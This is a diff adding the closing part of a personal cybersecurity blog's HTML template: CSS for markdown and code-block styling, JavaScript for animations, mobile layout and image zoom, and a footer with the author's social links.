+@media (max-width: 640px) {
+    .line-numbers .line-numbers-rows {
+        border-right: none !important;
+    }
+
+    .line-numbers-rows > span:before {
+        color: rgba(74, 222, 128, 0.3) !important;
+    }
+}
+
+/* Topic separator line */
+.markdown-content hr {
+    border: 0;
+    height: 2px;
+    background: linear-gradient(to right, rgba(74, 222, 128, 0.05), rgba(74, 222, 128, 0.2), rgba(74, 222, 128, 0.05));
+    margin: 2rem 0;
+    border-radius: 1px;
+}
+
+.markdown-content :not(pre) > code {
+    border-radius: 0.25rem;
+    padding: 0.2rem 0.4rem;
+    background: rgba(55, 65, 81, 0.3);
+    font-size: 0.875em;
+    color: #4ade80;
+    word-break: break-word;
+}
+
+.markdown-content pre code {
+    background-color: transparent;
+    padding: 0;
+    font-size: inherit;
+}
+
+/* Command prompt styling */
+.markdown-content .command-prompt {
+    background: rgba(31, 41, 55, 0.7);
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    border: 1px solid rgba(74, 222, 128, 0.1);
+    margin: 1rem 0;
+    font-family: 'JetBrains Mono', monospace;
+    color: #4ade80;
+    display: block;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    font-size: 0.875rem;
+}
+
+.markdown-content .command-prompt::before {
+    content: "$ ";
+    color: rgba(74, 222, 128, 0.5);
+}
+
+/* Terminal output styling */
+.markdown-content .terminal-output {
+    background: rgba(17, 24, 39, 0.7);
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    margin: 1rem 0;
+    font-family: 'JetBrains Mono', monospace;
+    color: #d1d5db;
+    white-space: pre-wrap;
+    display: block;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    font-size: 0.875rem;
+}
+
+/* Additional markdown content styles */
+.markdown-content {
+    color: #e5e7eb;
+    line-height: 1.75;
+}
+
+.markdown-content h1,
+.markdown-content h2,
+.markdown-content h3,
+.markdown-content h4 {
+    color: #4ade80;
+    margin-top: 1.5rem;
+    margin-bottom: 1rem;
+    font-weight: 600;
+    position: relative;
+    padding-left: 1.25rem;
+}
+
+.markdown-content h1::before,
+.markdown-content h2::before,
+.markdown-content h3::before,
+.markdown-content h4::before {
+    content: "#";
+    position: absolute;
+    left: 0;
+    color: rgba(74, 222, 128, 0.5);
+}
+
+.markdown-content h1 { font-size: 1.75rem; }
+.markdown-content h2 { font-size: 1.5rem; }
+.markdown-content h3 { font-size: 1.25rem; }
+.markdown-content h4 { font-size: 1.125rem; }
+
+@media (min-width: 640px) {
+    .markdown-content h1 { font-size: 2.25rem; }
+    .markdown-content h2 { font-size: 1.875rem; }
+    .markdown-content h3 { font-size: 1.5rem; }
+    .markdown-content h4 { font-size: 1.25rem; }
+}
+
+.markdown-content p {
+    margin: 1rem 0;
+}
+
+.markdown-content a {
+    color: #4ade80;
+    text-decoration: none;
+    transition: all 0.2s;
+    border-bottom: 1px dashed rgba(74, 222, 128, 0.3);
+    word-break: break-word;
+}
+
+.markdown-content a:hover {
+    border-bottom-style: solid;
+    border-bottom-color: #4ade80;
+}
+
+/* Enhanced list styling */
+.markdown-content ol {
+    counter-reset: section;
+    list-style-type: none;
+    padding-left: 2rem;
+    margin: 1rem 0;
+}
+
+.markdown-content ol > li {
+    counter-increment: section;
+    position: relative;
+    margin: 0.75rem 0;
+    padding-left: 0.5rem;
+}
+
+.markdown-content ol > li::before {
+    content: counter(section) ".";
+    position: absolute;
+    left: -2rem;
+    width: 1.75rem;
+    text-align: right;
+    color: #4ade80;
+    font-weight: 500;
+}
+
+/* Images */
+.markdown-content img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 0.5rem;
+    margin: 1rem 0;
+}
+
+/* Blockquotes */
+.markdown-content blockquote {
+    border-left: 3px solid #4ade80;
+    margin: 1rem 0;
+    padding: 0.5rem 0 0.5rem 1rem;
+    background: rgba(74, 222, 128, 0.05);
+    border-radius: 0 0.5rem 0.5rem 0;
+    font-style: italic;
+}
+
+/* Mobile optimizations */
+@media (max-width: 640px) {
+    .markdown-content {
+        font-size: 0.8125rem;
+        line-height: 1.5;
+    }
+
+    .markdown-content h1 { 
+        font-size: 1.25rem;
+        margin-top: 1rem;
+        margin-bottom: 0.625rem;
+        padding-left: 1rem;
+    }
+    
+    .markdown-content h2 { 
+        font-size: 1.125rem;
+        margin-top: 0.875rem;
+        margin-bottom: 0.625rem;
+        padding-left: 1rem;
+    }
+    
+    .markdown-content h3 { 
+        font-size: 1rem;
+        margin-top: 0.875rem;
+        margin-bottom: 0.5rem;
+        padding-left: 1rem;
+    }
+    
+    .markdown-content h4 { 
+        font-size: 0.9375rem;
+        margin-top: 0.875rem;
+        margin-bottom: 0.5rem;
+        padding-left: 1rem;
+    }
+
+    .markdown-content p {
+        margin: 0.625rem 0;
+        padding: 0 0.5rem;
+    }
+
+    .markdown-content pre[class*="language-"] {
+        margin: 0.625rem -0.5rem;
+        padding: 0.625rem;
+        border-radius: 0.375rem;
+        font-size: 0.75rem;
+    }
+
+    .markdown-content :not(pre) > code {
+        font-size: 0.75rem;
+        padding: 0.125rem 0.25rem;
+    }
+
+    .markdown-content .command-prompt,
+    .markdown-content .terminal-output {
+        margin: 0.625rem -0.5rem;
+        padding: 0.625rem;
+        font-size: 0.75rem;
+    }
+
+    .markdown-content blockquote {
+        margin: 0.625rem 0;
+        padding: 0.5rem 0.75rem;
+        font-size: 0.8125rem;
+    }
+
+    .markdown-content ol,
+    .markdown-content ul {
+        padding-left: 1.75rem;
+        margin: 0.625rem 0;
+        padding-right: 0.5rem;
+    }
+
+    .markdown-content ol > li,
+    .markdown-content ul > li {
+        margin: 0.375rem 0;
+        font-size: 0.8125rem;
+    }
+
+    .markdown-content ol > li::before {
+        left: -1.75rem;
+        width: 1.5rem;
+    }
+
+    .markdown-content img {
+        margin: 0.625rem -0.5rem;
+        max-width: calc(100% + 1rem);
+        border-radius: 0.375rem;
+    }
+
+    .markdown-content hr {
+        margin: 1.25rem 0;
+    }
+}
+
+/* Fix for mobile layout consistency */
+@media (max-width: 640px) {
+    body {
+        overflow-x: hidden;
+        width: 100%;
+        position: relative;
+    }
+
+    .glass {
+        width: 100vw;
+        max-width: 100%;
+        margin-left: -1rem;
+        margin-right: -1rem;
+        border-radius: 0;
+        padding-left: 1rem;
+        padding-right: 1rem;
+    }
+
+    .markdown-content {
+        width: 100%;
+        overflow-x: hidden;
+    }
+
+    /* Prevent horizontal scrolling on tables while maintaining functionality */
+    .markdown-content .table-wrapper {
+        margin-left: -1rem;
+        margin-right: -1rem;
+        padding-left: 1rem;
+        padding-right: 1rem;
+        width: calc(100% + 2rem);
+    }
+
+    .markdown-content table {
+        width: 100%;
+        min-width: 100%;
+    }
+
+    /* Fix image overflow */
+    .markdown-content img {
+        max-width: calc(100vw - 2rem);
+        margin-left: auto;
+        margin-right: auto;
+    }
+
+    /* Fix code block overflow */
+    .markdown-content pre[class*="language-"] {
+        max-width: calc(100vw - 2rem);
+        margin-left: -1rem;
+        margin-right: -1rem;
+        padding: 1rem;
+    }
+}
+
+/* Ensure consistent container width */
+.max-w-4xl {
+    max-width: min(100vw - 2rem, 56rem);
+}
+
+/* Fix navigation buttons on mobile */
+@media (max-width: 640px) {
+    .nav-button {
+        width: 100%;
+        justify-content: center;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+}
+
+/* Prevent content overflow */
+.markdown-content {
+    overflow-wrap: break-word;
+    word-wrap: break-word;
+    word-break: break-word;
+    hyphens: auto;
+}
+
+/* Fix table scrolling on mobile */
+.table-wrapper {
+    position: relative;
+    width: 100%;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+}
+
+.table-wrapper::before,
+.table-wrapper::after {
+    content: '';
+    position: absolute;
+    top: 0;
+    bottom: 0;
+    width: 1rem;
+    pointer-events: none;
+    z-index: 1;
+}
+
+.table-wrapper::before {
+    left: 0;
+    background: linear-gradient(to right, rgba(26, 26, 26, 0.9), transparent);
+}
+
+.table-wrapper::after {
+    right: 0;
+    background: linear-gradient(to left, rgba(26, 26, 26, 0.9), transparent);
+}
+
+/* Ensure consistent spacing */
+.prose {
+    max-width: none !important;
+}
+
+/* Fix container padding */
+@media (max-width: 640px) {
+    .px-2 {
+        padding-left: 0.5rem !important;
+        padding-right: 0.5rem !important;
+    }
+}
+</style>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    // Initialize AOS with optimized settings
+    AOS.init({
+        duration: 600,
+        easing: 'cubic-bezier(0.16, 1, 0.3, 1)',
+        once: true,
+        mirror: false,
+        offset: 50
+    });
+
+    // Add line numbers to code blocks with optimized animation
+    document.querySelectorAll('pre').forEach((block) => {
+        block.classList.add('line-numbers');
+        block.style.transition = 'all 0.2s cubic-bezier(0.37, 0, 0.63, 1)';
+    });
+
+    // Convert shell code blocks to command prompts with quick transitions
+    document.querySelectorAll('code[class*="language-shell"]').forEach((block) => {
+        if (block.parentElement.tagName === 'PRE') {
+            const lines = block.textContent.split('\n');
+            const formattedLines = lines.map(line => {
+                if (line.trim().startsWith('$') || line.trim().startsWith('>')) {
+                    return `<span class="command-prompt">${line.trim().substring(2)}</span>`;
+                } else {
+                    return `<span class="terminal-output">${line}</span>`;
+                }
+            });
+            block.innerHTML = formattedLines.join('\n');
+        }
+    });
+
+    // Add optimized hover effects to code blocks
+    document.querySelectorAll('pre[class*="language-"]').forEach((block) => {
+        block.addEventListener('mouseenter', () => {
+            block.style.transform = 'translateY(-2px)';
+            block.style.borderColor = 'rgba(74, 222, 128, 0.3)';
+            block.style.boxShadow = '0 4px 20px rgba(74, 222, 128, 0.1)';
+        });
+        
+        block.addEventListener('mouseleave', () => {
+            block.style.transform = 'translateY(0)';
+            block.style.borderColor = 'rgba(74, 222, 128, 0.1)';
+            block.style.boxShadow = 'none';
+        });
+    });
+
+    // Initialize list item animations with optimized timing
+    const listItems = document.querySelectorAll('.markdown-content ul > li, .markdown-content ol > li');
+    listItems.forEach((item, index) => {
+        item.style.setProperty('--li-index', index);
+        item.style.transition = 'all 0.2s cubic-bezier(0.37, 0, 0.63, 1)';
+    });
+
+    // Add smooth page transitions
+    document.querySelectorAll('a').forEach(link => {
+        if (link.hostname === window.location.hostname) {
+            link.addEventListener('click', e => {
+                e.preventDefault();
+                document.body.style.opacity = '0';
+                document.body.style.transform = 'translateY(10px)';
+                document.body.style.transition = 'all 0.2s cubic-bezier(0.37, 0, 0.63, 1)';
+                
+                setTimeout(() => {
+                    window.location.href = link.href;
+                }, 200);
+            });
+        }
+    });
+
+    // Add table wrapper for better mobile scrolling
+    document.querySelectorAll('.markdown-content table').forEach(table => {
+        const wrapper = document.createElement('div');
+        wrapper.className = 'table-wrapper';
+        table.parentNode.insertBefore(wrapper, table);
+        wrapper.appendChild(table);
+
+        // Check if table needs horizontal scrolling
+        const checkOverflow = () => {
+            wrapper.classList.toggle('has-overflow', table.scrollWidth > wrapper.clientWidth);
+        };
+
+        // Check on load and resize
+        checkOverflow();
+        window.addEventListener('resize', checkOverflow);
+    });
+
+    // Optimize images for mobile
+    document.querySelectorAll('.markdown-content img').forEach(img => {
+        img.addEventListener('load', () => {
+            if (img.naturalWidth > img.clientWidth) {
+                img.classList.add('zoomable');
+                img.addEventListener('click', () => {
+                    img.classList.toggle('zoomed');
+                });
+            }
+        });
+    });
+});
+</script>
+
+<style>
+/* Image zoom functionality for mobile */
+.markdown-content img.zoomable {
+    cursor: zoom-in;
+    transition: transform 0.3s ease;
+}
+
+.markdown-content img.zoomable.zoomed {
+    cursor: zoom-out;
+    transform: scale(1.5);
+    z-index: 10;
+    position: relative;
+}
+
+@media (max-width: 640px) {
+    .markdown-content img.zoomable.zoomed {
+        transform: scale(1.2);
+    }
+}
+</style>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="glass mt-16 py-8">
+        <div class="max-w-6xl mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="text-center md:text-left mb-4 md:mb-0">
+                    <p class="text-gray-400">&copy; 2025 Kaulik Makwana</p>
+                    <p class="text-sm text-gray-500 terminal-text">Cybersecurity Engineer & Penetration Tester</p>
+                </div>
+                <div class="flex space-x-6">
+                    <a href="https://github.com/KaulikMakwana" class="text-gray-400 hover:text-cyber-green transition-colors transform hover:scale-110" target="_blank" rel="noopener noreferrer">
+                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                            <path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd" />
+                        </svg>
+                    </a>
+                    <a href="https://www.linkedin.com/in/kaulik-makwana" class="text-gray-400 hover:text-cyber-green transition-colors transform hover:scale-110" target="_blank" rel="noopener noreferrer">
+                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                            <path fill-rule="evenodd" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z" clip-rule="evenodd" />
+                        </svg>
+                    </a>
+                    <a href="mailto:kaulik81@gmail.com" class="text-gray-400 hover:text-cyber-green transition-colors transform hover:scale-110" target="_blank" rel="noopener noreferrer">
+                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                            <path fill-rule="evenodd" d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" clip-rule="evenodd" />
+                        </svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- AOS JS -->
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    
+    <!-- Custom JS -->
+    <script src="/assets/js/markdown-viewer.js"></script>
+    
+    <!-- Initialize animations and interactions -->
+    <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        // Initialize AOS
+        AOS.init({
+            duration: 800,
+            easing: 'ease-out',
+            once: false,
+            mirror: true
+        });
+
+        // Scroll Progress Indicator
+        window.addEventListener('scroll', () => {
+            const scrollIndicator = document.querySelector('.scroll-indicator');
+            const scrolled = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
+            scrollIndicator.style.transform = `scaleX(${scrolled / 100})`;
+        });
+
+        // Mobile Menu Toggle
+        const menuButton = document.getElementById('menuButton');
+        const mobileNav = document.getElementById('mobileNav');
+        
+        if (menuButton && mobileNav) {
+            menuButton.addEventListener('click', () => {
+                menuButton.classList.toggle('active');
+                mobileNav.classList.toggle('active');
+            });
+
+            // Close menu when clicking outside
+            document.addEventListener('click', (e) => {
+                if (!menuButton.contains(e.target) && !mobileNav.contains(e.target)) {
+                    menuButton.classList.remove('active');
+                    mobileNav.classList.remove('active');
+                }
+            });
+
+            // Close menu when scrolling
+            let lastScroll = window.scrollY;
+            window.addEventListener('scroll', () => {
+                const currentScroll = window.scrollY;
+                if (Math.abs(currentScroll - lastScroll) > 10) {
+                    menuButton.classList.remove('active');
+                    mobileNav.classList.remove('active');
+                }
+                lastScroll = currentScroll;
+            });
+        }
+
+        // Add hover effect to cards
+        document.querySelectorAll('.glass').forEach(card => {
+            card.classList.add('card-hover');
+        });
+
+        // Add button animations
+        document.querySelectorAll('a[href], button').forEach(button => {
+            if (!button.classList.contains('menu-button')) {
+                button.classList.add('btn');
+            }
+        });
+
+        // Terminal typing effect
+        function typeWriter(element, text, speed = 50) {
+            let i = 0;
+            element.textContent = '';
+            function type() {
+                if (i < text.length) {
+                    element.textContent += text.charAt(i);
+                    i++;
+                    setTimeout(type, speed);
+                }
+            }
+            type();
+        }
+
+        // Apply typing effect to terminal text
+        document.querySelectorAll('.terminal-text').forEach(el => {
+            const originalText = el.textContent;
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        typeWriter(el, originalText);
+                        observer.unobserve(el);
+                    }
+                });
+            });
+            observer.observe(el);
+        });
+    });
+    </script>
+</body>
+</html>
